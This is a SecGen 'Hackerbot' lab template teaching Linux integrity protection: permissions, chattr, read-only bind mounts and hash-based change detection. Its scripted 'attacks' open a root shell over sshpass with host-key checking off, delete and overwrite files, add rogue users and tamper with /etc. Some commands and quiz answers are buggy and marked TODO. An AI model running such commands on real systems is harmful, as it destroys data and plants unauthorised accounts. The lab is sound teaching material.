<%
  require 'json'
  require 'securerandom'
  require 'digest/sha1'
  require 'fileutils'

  if self.accounts.empty?
    abort('Sorry, you need to provide an account')
  end

  $first_account = JSON.parse(self.accounts.first)
  $files = []
  $log_files = []
  if $first_account.key?("leaked_filenames") &&  $first_account['leaked_filenames'].size > 0
    $files = $first_account['leaked_filenames']
    $log_files = $first_account['leaked_filenames'].grep(/log/)
  end

  if $files.empty?
    $files = ['myfile', 'afile', 'filee', 'thefile']
  end
  if $log_files.empty?
    $log_files = ['log', 'thelog', 'logs', 'frogonalog']
  end

  $main_user = $first_account['username'].to_s

  $root_password = self.root_password
  $flags = self.flags

  REQUIRED_FLAGS = 17
  while $flags.length < REQUIRED_FLAGS
    $flags << "flag{#{SecureRandom.hex}}"
    Print.err "Warning: Not enough flags provided to hackerbot_config generator, some flags won't be tracked/marked!"
  end

%>
<?xml version="1.0"?>

<hackerbot
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
               xsi:schemaLocation="http://www.github/cliffe/SecGen/hackerbot">
<!--<hackerbot xmlns="http://www.github/cliffe/SecGen/hackerbotz"-->

	<name>Hackerbot</name>

	<AIML_chatbot_rules>config/AIML</AIML_chatbot_rules>

	<!--Method for gaining shell access, can be overwritten per-attack-->
	<!--<get_shell>bash</get_shell>-->
	<get_shell>sshpass -p <%= $root_password %> ssh -oStrictHostKeyChecking=no root@{{chat_ip_address}} /bin/bash</get_shell>

	<messages>
		<greeting>Your system is about to be hacked. I'll do what I can hold them off, but you are going to have to work with me to protect yourself. I'll cough up some flags if you work with me.</greeting>

		<!--Must provide alternatives for each message-->
		<say_ready>Let me know when you are 'ready', if you want to move on to another attack, say 'next', or 'previous' and I'll move things along</say_ready>
		<say_ready>When you are ready, simply say 'ready'.</say_ready>
		<say_ready>'Ready'?</say_ready>
		<say_ready>Better hurry, the attack is imminent... Let me know when you're 'ready'.</say_ready>
		<next>Ok, I'll do what I can to move things along...</next>
		<next>Moving things along to the next attack...</next>
		<next>Ok, next attack...</next>
		<previous>Ok, I'll do what I can to back things up...</previous>
		<previous>Ok, previous attack...</previous>
		<previous>Ok, backing up.</previous>
		<goto>Ok, skiping it along.</goto>
		<goto>Let me see what I can do to goto that attack.</goto>
		<last_attack>That was the last attack for now. You can rest easy, until next time... (End.)</last_attack>
		<last_attack>That was the last attack. Game over?</last_attack>
		<first_attack>You are back to the beginning!</first_attack>
		<first_attack>This is where it all began.</first_attack>
		<getting_shell>Ok. Gaining shell access, and running post command...</getting_shell>
		<getting_shell>Hacking in progress...</getting_shell>
		<getting_shell>Attack underway...</getting_shell>
		<getting_shell>Here we go...</getting_shell>
		<got_shell>We are in to your system.</got_shell>
		<got_shell>You are pwned.</got_shell>
		<got_shell>We have shell.</got_shell>
		<repeat>Let me know when you are 'ready', if you want to move on to another attack, say 'next', or 'previous' and I'll move things along</repeat>
		<repeat>Say 'ready', 'next', or 'previous'.</repeat>

		<!--Single responses:-->
		<help>I am waiting for you to say 'ready', 'next', 'previous', 'list', 'goto *X*', or 'answer *X*'</help>
		<say_answer>Say "The answer is *X*".</say_answer>
		<no_quiz>There is no question to answer</no_quiz>
		<correct_answer>Correct</correct_answer>
		<incorrect_answer>Incorrect</incorrect_answer>
		<invalid>That's not possible.</invalid>
		<non_answer>Wouldn't you like to know.</non_answer>

		<!--can be overwritten per-attack-->
		<shell_fail_message>Oh no. Failed to get shell... You need to let us in.</shell_fail_message>
	</messages>

	<tutorial_info>
		<title>Integrity Management: Protecting Against and Detecting Change</title>
		<tutorial>
<%= render "intro.md.erb" %>
		</tutorial>
		<footer>
## Resources

An excellent resource on the subject of integrity management is Chapter 20 of the excellent book *Practical Unix & Internet Security, 3rd Ed*, by Garfinkel et al (2003).

## License
This lab by [*Z. Cliffe Schreuders*](http://z.cliffe.schreuders.org) at Leeds Beckett University is licensed under a [*Creative Commons Attribution-ShareAlike 3.0 Unported License*](http://creativecommons.org/licenses/by-sa/3.0/deed.en_GB).

Generated by SecGen (<%= Time.new.to_s %>)
		</footer>

		<provide_tutorial>true</provide_tutorial>

	</tutorial_info>

	<attack>
<% $file = $files.sample -%>
		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $file %> is coming. Stop the attack using access controls.</prompt>

		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $file %>; echo $?</post_command>
		<condition>
			<output_matches>Permission denied</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition>
			<output_equals>0</output_equals>
			<message>:( We managed to delete your file! You need to use access controls to protect the file. Create a new file.</message>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file <%= $file %> should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial>
### Protecting integrity with file permissions
#### Getting to know file permissions
Open a terminal console (such as Konsole from KDEMenu → Applications → System → Konsole).

Start by creating a file with some content. Run:

```bash
sudo bash -c 'cat > /var/log/mylogfile'
```
> (Type some content, then press Ctrl-D to finish and return to the
prompt.)

Look at the details of the file:

```bash
ls -la /var/log/mylogfile
```
``
 -rw-r--r-- 1 root root 20 Feb 7 17:38 /var/log/mylogfile
``

As we can see above, the file is owned by root, who has read-write access.

Exploring Unix file permissions further is outside the scope of this lab, but will be covered elsewhere.
		</tutorial>
	</attack>

	<attack>
<% $log_file = $log_files.sample -%>
		<!--<topic>Protecting integrity with file attributes</topic>-->
		<prompt>An attempt to delete /home/<%= $main_user %>/<%= $log_file %> is coming. Stop the attack using file attributes.</prompt>

		<post_command>rm --interactive=never /home/<%= $main_user %>/<%= $log_file %>; echo $?</post_command>
		<condition>
			<output_matches>Operation not permitted</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition> <!-- TODO: chmod to defeat the defense? -->
			<output_matches>Permission denied</output_matches>
			<message>:( You did protect the file, but not using file attributes.</message>
		</condition>
		<condition>
			<output_equals>0</output_equals>
			<message>:( We managed to delete your file! You need to use file attributes to protect the file.  Create a new file.</message>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial>
### Protecting integrity with file attributes
#### Getting to know file attributes
Unix systems (such as Linux or FreeBSD) include file attributes that, amongst other features, can make files immutable or append only. Setting these file attributes can provide an effective layer of security, and yet could be considered one of the more obscure Unix security features[^1]. Note that this feature is dependent on the use of a compatible filesystem (most Unix filesystems, such as ext, are compatible with file attributes). Once configured, file attributes can even prevent root (the all-powerful Unix superuser) from making changes to certain files.

[^1]: Setting a file to immutable (and therefore impossible to simply delete) can be an effective prank against the uninitiated in Unix ways.

Run:
```bash
lsattr /var/log/mylogfile
```
``
 -------------e- /var/log/mylogfile
``

The ‘e’ flag is common on ext filesystems, may or may not be present when you run the above, and does not really concern us. From a security perspective the ‘a’ and ‘i’ flags are the most interesting. Read the man page for chattr to find out more about these flags and what they do:

```bash
man chattr
```
> (Press q to leave the manual page)

Set the ‘i’ flag using the chattr command:
```bash
sudo chattr +i /var/log/mylogfile
```

Now try to delete the file and see what happens:
```bash
rm /var/log/mylogfile
```
Denied! Opps, that’s right, root owns the file (since you created it with sudo)! Use root to try to delete the file:
```bash
sudo rm /var/log/mylogfile
```

It still didn’t work! That’s right, even root can’t delete the file, without changing the file’s attributes back first.

Use some commands to remove the ‘i’ flag (hint: “-i”, instead of “+i”).

Now run a command to set the ‘a’ flag on /var/log/mylogfile.

If you have done so correctly, attempting to overwrite the file with a test message should fail:
```bash
sudo bash -c 'echo "test message" > /var/log/mylogfile'
```
> This should produce an error, since ‘&gt;’ causes the output of the program to be written to the specified log file, which is not allowed due to the chattr command you have run.

Yet you should be able to append messages to the end of the file:

```bash
sudo bash -c 'echo "YOURNAME: test message" >> /var/log/mylogfile'
```
> This should succeed, since ‘&gt;&gt;’ causes the output of the program to be appended (added to the end of) to the specified log file, which is allowed. Use your name above, for example “echo "Cliffe: test message" &gt;&gt; /var/log/mylogfile”.

View your changes at the end of the file:

> tail /var/log/mylogfile

This has obvious security benefits, this feature can be used to allow files to be written to without altering existing content. For example, for ensuring that log files can be written to, but avoiding giving everyone who can write to the file the ability to alter its contents.
		</tutorial>
	</attack>

	<attack>
<% $log_file = $log_files.sample -%>
		<!--<topic>Protecting integrity with file attributes</topic>-->
		<prompt>An attempt to overwrite /home/<%= $main_user %>/<%= $log_file %> is coming. Stop the attack by making the file append only.</prompt>

		<post_command>echo 'your logs are gone!' > /home/<%= $main_user %>/<%= $log_file %>; echo 'damn!' >> /tmp/test/log1; tail /tmp/test/log1</post_command>
		<condition>
			<output_not_matches>damn!</output_not_matches>
			<message>:( You stopped anything from being appended to the file. What kind of log file do you think this is?</message>
		</condition>
		<condition>
			<output_matches>Operation not permitted</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack>true</trigger_next_attack>
		</condition>
		<condition>
			<output_matches>No such file or directory</output_matches>
			<message>:( The file should exist!</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>
		<tutorial>

		</tutorial>
	</attack>

	<attack>
		<!--<topic>Protecting integrity with read-only filesystems</topic>-->
		<prompt>An attempt to edit a file in /etc is coming. Stop the attack by bind mounting /etc/ as read-only.</prompt>

		<post_command>touch /etc/you_were_hacked; adduser yourehacked</post_command>
		<condition>
			<output_matches>Read-only file system</output_matches>
			<message>:) Well done! <%= $flags.pop %></message>
			<trigger_next_attack />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted</output_matches>
			<message>:( You stopped the attack, but not by using read only bind mounting...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<tutorial>
### Protecting integrity with read-only filesystems
#### Getting to know read-only bind mounting
On Unix, a filesystem is mounted to a particular point in the directory structure; for example, a USB thumb drive may be mounted to /media/myUSB/. Some filesystems will automatically mount read-only; for example, if you insert a CD-ROM, since those disks are physically read-only. It is possible to optionally mount almost any filesystem, such as a USB or even a directory, in read-only mode, which will make it practically impossible to write changes to it (without remounting or accessing the drive/directory in other ways, which normally only root can do).

In a command prompt, run:
```bash
mount
```
> Note that many of the devices and directories have been mounted for read and write access (**rw**). For security reasons, it can be safer to mount things as read-only, when we don’t need to be able to make changes to the contents.

Ordinary users can only read the /etc directory but the superuser root who owns the /etc directory can read and write to it. In the following example, you are going to mount the /etc directory to a mount point (another directory within the filesystem) and the contents of the /etc directory will be accessible via the mount point.

List the contents of the /etc directory so you are familiar with its contents:
```bash
ls /etc
```
Create a new directory to be the mount point:
```bash
mkdir /home/<%= $main_user %>/test
```
Mount the /etc directory to the new mount point:
```bash
sudo mount -o bind /etc /home/<%= $main_user %>/test
```
Make sure the /etc directory is accessible via the test directory mount point:
```bash
ls /home/<%= $main_user %>/test
```
Ordinary users can only read but the superuser root can still write to the directory. Test this by creating a new file as the superuser root in the /home/student/test directory:
```bash
sudo touch /home/<%= $main_user %>/test/file1
```
Check that a new file has been created using the following commands
```bash
ls -l /home/<%= $main_user %>/test/file1
```
```bash
ls -l /etc/file1
```
We can use this techniques to make filesystems and directories read-only. In the next example you will remount the etc in read-only mode so that even the superuser root who owns the /etc directory cannot make changes to its contents via the mount point.
```bash
sudo mount -o remount,ro,bind /etc /home/<%= $main_user %>/test
```
Test this by trying creating a new file as the superuser root in the /home/<%= $main_user %>/test directory:
```bash
sudo touch /home/<%= $main_user %>/test/file2
```
This should prevent changes being accidently being made to important configuration files in the /etc directory.

Remount the the /etc directory as read-only to itself:
```bash
sudo mount -o remount,ro,bind /etc /etc
```
Mounting read-only can be an effective way of protecting resources that you don’t need to make any changes to. Read-only mounting is particularly effective when an actual disk resides externally, and can be enforced remotely. For example, when sharing files over the network.

> Note that mounting read-only may be circumvented by root (or a user with enough privilege) via direct access to the device files (/dev/sdc1 in the example above), or by re-mounting as read-write.

> Aside: in new versions of Linux, it is also possible to have a directory (one part of what is on a disk) present in the directory structure twice with different mount options (for example, /home/<%= $main_user %> and /home/<%= $main_user %>-read-only). This can be achieved by bind mounting, and then remounting to set the bind mount to read only. More information: [http://lwn.net/Articles/281157/](http://lwn.net/Articles/281157/)
		</tutorial>
	</attack>

	<attack>
<% $random_user = SecureRandom.hex -%>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to add a new user is coming, let it happen. But first create a backup of /etc/passwd.</prompt>

		<post_command>sudo adduser hackerbot --gecos '<%= $random_user %>' --disabled-password --quiet; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>User added</message>
			<!--<trigger_next_attack>true</trigger_next_attack>-->
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>already exists</output_matches>
			<message>:( Remove the user and try again.</message>
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Now after the attack, find the username added by diffing using a backup. What username was created?</question>
			<answer>^<%= $random_user %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	<tutorial>
## Detecting changes to resources

Although we can aim to protect integrity, eventually even the strongest defenses can fail, and when they do we want to know about it! In order to respond to a security incident we need to detect that one has occurred. One way we do so, is to detect changes to files on our system.

### Detecting changes to resources using backups

One technique is to compare files to a backup known to represent the system or resources in a clean state. One advantage of this approach is that we cannot only detect that files have changed, but also see exactly how they differ.

Make a backup of your /etc/passwd file:

```bash
cp /etc/passwd /tmp/passwd_backup
```

This file (/etc/passwd) is an important file on Unix systems, which lists the user accounts on the system. Although historically the hashes of passwords were once stored here, they are now typically stored in /etc/shadow. Changes to the /etc/passwd file are usually infrequent – such as when new user accounts are created – and changes should only be made for authorised purposes.

Add a new user to your computer...

```bash
useradd *new-username*
```
> Where new-username, is some new name.

To make things even more interesting, edit the /etc/passwd file and move the new user account line somewhere other than right at the bottom, so that it is less obvious:

```bash
vi /etc/passwd
```
> Move the cursor onto the line representing your new account (probably at the bottom).
>
> In vi type:
>
> :m *-number*
>
> Where number is the number of lines to move up, for example: “:m -20” will move the currently selected line up 20 lines, “hiding” the new user account amongst the others.
>
> Save your changes and exit vi by typing:
>
> :wq

Look at the changes in your accounts made on your computer, and try to spot the new user account:
```bash
less /etc/passwd
```
> (q to exit)

It’s not as easy as it sounds, especially if your system has lots of user accounts.

Since you have a backup of your passwd file, you can compare the backup with the current passwd file to determine it has been modified. One such tool for determining changes is diff. Diff is a standard Unix command.
Run:
```bash
diff -q /tmp/passwd_backup /etc/passwd
```
Diff should report that the two files differ. Diff can also produce an easy to read description of exactly how the file has changed. This is a popular format used by programmers for sharing changes to source code:

```bash
diff -u /tmp/passwd\_backup /etc/passwd
```

There are many advantages to the comparison of backups approach to detecting changes, but it also has its limitations. To apply this approach to an entire system, you will need a fairly large amount of either local or network shared storage, and writes need to be controlled to protect the backups, yet written to whenever authorised changes are made to keep the backup up-to-date. Also, when the comparisons are made substantial disk/network access is involved, since both both sources need to be read at the same time in order to do the comparison.

In the example above, the backup was stored on the same computer. Did you think as an attacker of editing the backup passwd file? This is related to a major issue when checking for changes to the system: if your system has been compromised, then you can’t necessarily trust any of the local software or files, since they may have been replaced or modified by an attacker. For that reason, it can be safer to run software (such as diff) from a separate read-only storage. Yet that still may not be enough, the entire operating system could be infected by a rootkit.

> Note: diff can compare entire mirrored directory structures to each other. For example, if you wanted to know exactly what changes have happened since a backup.
> Aside: Filesystems, such as btrfs, that support history and snapshots can also be helpful for investigating breaches in integrity.
	</tutorial>
	</attack>

	<attack>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to edit a config file is coming, let it happen. But first create a backup of the /etc/ directory to /tmp/etc-backup/.</prompt>

		<post_command>echo '# <%= $flags.pop %>' >> `find /etc/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>A flag has been inserted into a random file... Use your backups to compare /etc/ to the backup to find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes...</message>
		</condition>
		<else_condition>
			<message>:( Something was not right...</message>
		</else_condition>

		<quiz>
			<question>Find the flag, what file was the flag stored in?</question>
			<answer>^/etc/.*sh$</answer>
			<correct_answer_response>:) Well done</correct_answer_response>
			<trigger_next_attack />
		</quiz>

	</attack>

	<attack>
		<!--<topic>Detecting changes to resources using backups</topic>-->
		<prompt>An attempt to edit a config file is coming, let it happen.</prompt>

		<post_command>echo '# <%= $flags.pop %>' >> `find /tmp/etc-backup/ -name '*.sh' | sort -R | head -n 1`; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>A flag has been inserted into a random file IN YOUR BACKUPS! (Did you really think that was a safe place to store them?) Find the flag. Get to work!</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We are trying to write to /tmp/etc-backup/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /tmp/etc-backup/</message>
		</else_condition>

		<quiz>
			<question>Find the flag, what file was the flag stored in?</question>
			<answer>^/etc-backup/.*sh$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<attack>
<% $random = SecureRandom.hex -%>

		<!--<topic>File integrity checkers</topic>-->
		<prompt>Creating a new file in /home/<%= $main_user %>/...</prompt>

		<post_command>echo '<%= $random %>' > /home/<%= $main_user %>/something_secret; echo $?</post_command>
		<condition>
			<output_matches>0</output_matches>
			<message>Created /home/<%= $main_user %>/something_secret</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the SHA1 hash of /home/<%= $main_user %>/something_secret?</question>
			<answer>^<%= Digest::SHA1.hexdigest ("#{$random + "\n"}") %>$</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial>
### Detecting changes to resources using hashes and file integrity checkers

Another technique for detecting modifications to files is to use hashes
of files in their known good state. Rather than storing and comparing
complete copies, a one way hash function can be used to produce a fixed
length hash (or “digest”), which can be used for later comparisons.
Hashes have security properties that enable this use:

-   Each hash is unique to the input

-   It is extremely difficult (practically impossible) to find another input that produces the same hash output

-   Any change to the input (no matter how minor) changes the output hash dramatically

We can store a hash and later recompute the hash, to determine whether
the file has changed (if the hash is different), or it is exactly the
same (if the hash is the same). If you have studied digital forensics,
many of these concepts will be familiar to you, since hashes are also
commonly used for verifying the integrity of digital evidence.

Generate an MD5 hash of your backup password file, which you copied
above:

> md5sum /tmp/passwd\_backup

Now calculate a hash of your current passwd file:

> md5sum /etc/passwd

If the generated hashes are different, you know the files do not have
exactly the same content.

Note that using hashes, there is no need to have the backup on-hand in
order to check the integrity of files, you can just compare a newly
generated hash to a previous one.

Repeat the above two commands using shasum rather than md5sum. SHA1 and
SHA2 are considered to be more secure than the “cryptographically
broken” MD5 algorithm. Although MD5 is still in use today, it is safer
to use a stronger hash algorithm, since MD5 is not collision-resistant,
meaning it is possible to find multiple files that result in the same
hash. SHA1 is considered partially broken, so a new algorithm such as
SHA2 is currently a good option. There are a number of related commands
for generating hashes, named md5sum, shasum, sha224sum, sha256sum, and
so on. These commands (as well as those in the next section) are readily
available on most Unix systems, and are also available for Windows.

#### File integrity checkers

A file integrity checker is a program that compares files to previously
generated hashes. A number of these kinds of tools exist, and these can
be considered a form of host-based intrusion detection system (HIDS),
particularly if the checking happens automatically. One of the most well
known integrity checkers is Tripwire, which was previously released open
source; although, new versions are closed source and maintained by
Tripwire, Inc, with a more holistic enterprise ICT change management
focus. There are other tools similar to Tripwire, such as AIDE (Advanced
Intrusion Detection Environment), and OSSEC (Open Source Host-based
Intrusion Detection System).

The above md5sum, shasum (and so on) programs can also be used to check
a list of file hashes.

Create an empty file, where *your-name*, is your actual name:

> touch *your-name*

Run the following to generate a file containing hashes of files we can
later check against:

> shasum *your-name* &gt;&gt; /tmp/hash.sha
>
> shasum /etc/passwd &gt;&gt; /tmp/hash.sha
>
> sudo shasum /etc/shadow &gt;&gt; /tmp/hash.sha
>
> shasum /bin/bash &gt;&gt; /tmp/hash.sha
>
> shasum /bin/ls &gt;&gt; /tmp/hash.sha

Look at the contents of our new hashes file (Q to quit when done):

> less /tmp/hash.sha

Now use your new hash list to check that nothing has changed since we
generated the hashes:

> shasum -c /tmp/hash.sha

Why does shasum fail to check the integrity of the shadow file?

Make a change to our empty “*your-name*” file:

> echo "hello" &gt; *your-name*

Check whether anything has changed since we generated hashes:

> shasum -c /tmp/hash.sha

You should see a nice explanation of the files that have changed since
generating the hashes.

#### Scripted integrity checking

The above can also be accomplished via a simple script (in this case a
Perl script):
	
	#!/usr/bin/perl
	
	# Copyleft 2012, Z. Cliffe Schreuders
	
	# Licenced under the terms of the GPLv3
	
	use warnings;
	
	use strict;
	
	my %files\_hashes = (
	
		"/bin/ls"=&gt;"9304c5cba4e2a7dc25c2d56a6da6522e929eb848",
	
		"/bin/bash"=&gt;"54d0d9610e49a654843497c19f6211b3ae41b7c0",
	
		"/etc/passwd"=&gt;"69773dcef97bca8f689c5bc00e9335f7dd3d9e08"
	
	);
	
	foreach my \$file\_entry (keys %files\_hashes) {
	
	my \$hash = \`sha1sum \$file\_entry|awk '{print \\\$1}'|head -n1\`;
	
	chomp(\$hash);
	
	if(\$hash ne \$files\_hashes{\$file\_entry}){
	
	warn "FILE CHANGED: \$file\_entry (hash was \$hash, expected
	\$files\_hashes{\$file\_entry})\\n";
	
	} else {
	
	print "File unmodified: \$file\_entry (hash was \$hash, as
	expected)\\n";
	
	}
	
	}

This script simply iterates over a list of file paths with SHA1 hashes
(stored in an associative array), and runs sha1sum for each one to check
whether the files are still the same.

Save the script as checker.pl (Help: you may wish to install the default
KDE GUI text editor Kate, if it is not already installed under the
Utlities menu. You should be able to copy the script and paste it into
Kate to save it as checker.pl. Kate can be installed using the following
command: “sudo zypper install kate”)

Then run the script with:

> perl checker.pl

Are the files reported as unmodified, or have they changed? Why might
they be different to when I wrote the script?

		</tutorial>
	</attack>

	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to edit one of your files in /etc/, use hash comparisons to detect which file changes</prompt>
		<post_command>x=`find /etc/ -name '*.sh' | sort -R | head -n 1`; echo '' >> $x; echo $x</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that changed?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
		<tutorial>
##### Recursive file integrity checkers

The md5deep program (also known as sha1deep, sha256deep, and so on for
different hash algorithms) can recursively walk through directories (and
into all contained subdirectories) to generate and check lists of
hashes.

Run:

> sudo sha1deep -r /etc
>
> If the md5deep command is not available, install it:
>
> On openSUSE this can be done by first running “cnf sha1deep”, to find
> the name of the package containing the program, then run the install
> command it gives you, such as “sudo zypper install md5deep”.
>
> If you get “PackageKit is blocking zypper”, then select “no”, and kill
> PackageKit, by running “kill -9 *pid*”, where *pid* is the number
> reported by the previous command. Now run the above again.
>
> If the zypper command is stuck on refreshing a repository, then press
> “Ctrl-C”, “a” (for abort), then proceed with the installation as per
> normal.
>
> Once the required software is installed, try the sha1deep command
> again.

The output of the above command will include hashes of every file in
/etc, which is where system-wide configuration files are stored on Unix.

Read the sha1deep manual to understand the above command:

> man sha1deep
>
> Figure out what the -r flag does.
>
> (Q to quit)

We can save (redirect) this output to a file so that we have a record of
the current state of our system’s configuration:

> sudo sha1deep -r /etc &gt; /tmp/etc\_hashes

This may take a minute or so, while the program calculates the hashes
and sends them to standard out (known as stdout), which is then
redirected to the etc\_hashes file.

Next, let's compare the size of our list of hashes, with the actual
content that we have hashed...

See how big our list of hashes is:

> ls -hs /tmp/etc\_hashes
>
> (-h = human readable, -s = size)

This is likely to be in the Kilobytes.

And for the size of all of the files in /etc:

> sudo du -hs /etc
>
> (-h = human readable, -s summarise)

This is likely in the Megabytes (or maybe even Gigabytes).

Clearly, the list of hashes is much smaller.

If you are **working with a classmate**, log into their system using ssh
(as done previously). If you are working alone, simply run all the
commands on your own system.

Create a new file somewhere in /etc/, containing your name. Name the
file whatever you like (for example /etc/test), although the more
inconspicuous the better.

> Hint: “sudo vi /etc/test”, “i” to enter insert mode, and after typing
> your name, “Esc”, “:wq”.

Also, change an existing file in /etc on their system, but please do be
careful to only make a minor change that will **not cause damage to
their system**. For example, you could use vi to edit /etc/hostname
(“sudo vi /etc/hostname”), and add a comment to the file such as
“\#your-name: bet you can’t find this comment!”

You can now “exit” the ssh session.

**On your own system**, lets try to identify what the “attacker” has
done to our system...

Now that we have a list of hashes of our files, use shasum to check if
anything has changed using our newly generated list of hashes
(/tmp/etc\_hashes).

> Hint: look at the previous command using shasum to check hashes.

Does this detect our the changed file AND the new file? Why not?

Md5deep/sha1deep takes a different approach to checking integrity, by
checking all of the files it is told to check (possibly recursing over
all files in a directory) against a list of hashes, and reporting
whether any files it checked did not (or did, depending on the flags
used) have its hash somewhere in the hash list.

Run sha1deep to check whether any files in /etc/ do not match a hash
previously generated:

> sudo sha1deep -X /tmp/etc\_hashes -r /etc

This should detect both modified files, both new and modified.

But would sha1deep detect a copy of an existing file, to a new location?

Try it:

> sudo cp /etc/passwd /etc/passwd.backup

Now rerun the previous sha1deep command. Was the copy detected? Why not?

What about copying one file over another? Which out of shasum or
sha1deep would detect that?

Another tool, hashdeep, which is included with md5deep, provides more
coverage when it comes to detecting files that have moved, changed, or
created.

Generate a hash list for /etc using hashdeep:

> sudo hashdeep -r /etc &gt; /tmp/etc\_hashdeep\_hashes

Hashdeep stores hashes in a different format than the previous tools.
Have a look:

> less /tmp/etc\_hashdeep\_hashes
>
> (q to quit)
>
> Note that the output includes some more information, such as the file
> size for each file.

Delete the new file that your “attacker” (the person who sshed into your
system) created earlier:

> sudo rm /etc/*whatever-the-filename-was*

Conduct a hashdeep audit to detect any changes:

> sudo hashdeep -r -a -k /tmp/etc\_hashdeep\_hashes /etc
>
> Note, that this can take a while, so feel free to start working
> through the next section in another terminal, if you like.

After, run it again, this time asking for more details, since the
default message does not provide any information as to why an audit has
failed:

> sudo hashdeep -ra**vv** -k /tmp/etc\_hashdeep\_hashes /etc

Consult the man page for information about what each of the above flags do.
		</tutorial>
	</attack>

	<!--TODO test this-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to create a new file in /etc/, use hash comparisons to detect which new file changes (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>x=`find /etc/ -type d' | sort -R | head -n 1`; mktemp -p $x -t "XXXXXXXX"</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<!--TODO could further randomise outcomes, actually copies rather than creating a new binary-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to copy a new random binary in /bin/|/usr/bin/ use hash comparisons to find the filename of the copied file (hint: sha1deep, hashdeep, or shasum)</prompt>
		<post_command>srcf=`find /bin/ /usr/bin/ -executable | sort -R | head -n 1`; dest=$srcf.$RANDOM; cp $srcf $dest; echo $dest</post_command>
		<suppress_command_output_feedback />

		<condition>
			<output_matches>/etc.*</output_matches>
			<message>Good. Now answer this...</message>
			<trigger_quiz />
		</condition>
		<condition>
			<output_matches>Permission denied|Operation not permitted|Read-only</output_matches>
			<message>:( You stopped the attack, rather than monitor for changes... We need to be able to write to /secrets/something_secret/</message>
		</condition>
		<else_condition>
			<message>:( Something was not right... We are trying to write to /secrets/something_secret</message>
		</else_condition>

		<quiz>
			<question>What is the file that was created?</question>
			<answer>{{post_command_output}}</answer>
			<correct_answer_response>:) <%= $flags.pop %></correct_answer_response>
			<trigger_next_attack />
		</quiz>
	</attack>

	<!--TODO test this-->
	<!--TODO could further randomise outcomes, actually copies rather than creating a new binary-->
	<attack>
		<!--<topic>File integrity checkers</topic>-->
		<prompt>Going to move random binaries in /bin/|/usr/bin/ use hash comparisons to find the filename (hint: sha1deep, hashdeep, or shasum)</prompt>
